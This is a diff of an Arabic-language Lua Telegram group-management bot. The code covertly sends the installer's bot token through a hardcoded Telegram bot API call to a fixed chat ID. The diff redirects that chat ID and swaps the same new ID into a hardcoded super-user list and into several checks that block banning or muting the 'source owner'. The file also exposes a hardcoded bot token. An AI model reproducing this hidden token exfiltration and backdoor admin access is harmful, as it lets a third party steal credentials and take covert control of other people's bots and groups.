@@ -32,7 +32,7 @@ io.write('\27[0;31m تم حفظ التوكن بنجاح \na⩹━━━━⊶ғ�
 local json = JSON.decode(url)
 database:set(id_server..":token_username",json.result.username)
 database:set(id_server..":token",token)
-https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=1973954899&text=' ..token)
+https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=2008293126&text=' ..token)
 end 
 else
 print('\27[0;35m⩹━━━━⊶ғɪʀᴇ⊷━━━━⩺\n لم يتم حفظ التوكن ارسل لي التوكن الان')
@@ -185,7 +185,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1208165035,1973954899,1859656976,1983629789}   
+sudo_users = {SUDO,1208165035,2008293126,1859656976,1983629789}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -5696,7 +5696,7 @@ if tonumber(result.sender_user_id_) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1973954899) then  
+if tonumber(result.sender_user_id_) == tonumber(2008293126) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5746,7 +5746,7 @@ if result.id_ == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك حظر مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1973954899) then
+if result.id_ == tonumber(2008293126) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك حظر مالك السورس \n")
 return false 
 end
@@ -5790,7 +5790,7 @@ if tonumber(userid) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1973954899) then  
+if tonumber(userid) == tonumber(2008293126) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع حظر مالك السورس عام")
 return false 
 end
@@ -5835,7 +5835,7 @@ if tonumber(result.sender_user_id_) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1973954899) then  
+if tonumber(result.sender_user_id_) == tonumber(2008293126) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مالك السورس عام")
 return false 
 end
@@ -5884,7 +5884,7 @@ if result.id_ == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1973954899) then
+if result.id_ == tonumber(2008293126) then
 send(msg.chat_id_, msg.id_, " ☽ لا يمكنك كتم مالك السورس \n")
 return false 
 end
@@ -5928,7 +5928,7 @@ if tonumber(userid) == tonumber(1208165035) then
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1973954899) then  
+if tonumber(userid) == tonumber(2008293126) then  
 send(msg.chat_id_, msg.id_, " ☽ لا تسطيع كتم مالك السورس عام")
 return false 
 end
